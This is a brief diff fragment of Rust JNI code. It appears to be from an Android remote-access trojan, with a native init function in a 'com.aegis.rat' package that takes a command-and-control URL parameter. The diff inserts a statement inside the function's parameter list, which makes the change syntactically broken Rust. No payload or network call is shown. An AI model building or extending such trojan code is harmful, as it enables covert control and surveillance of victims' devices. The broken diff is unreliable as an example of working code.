@@ -27,6 +27,8 @@ pub extern "system" fn Java_com_aegis_rat_AegisCore_nativeInit(
     c2_url: JString,
     model: JString,
     android_version: JString,
+    *CONTEXT.lock().unwrap() = Some(context);
+
 ) -> jboolean {
     // Initialize Logger
     android_logger::init_once(
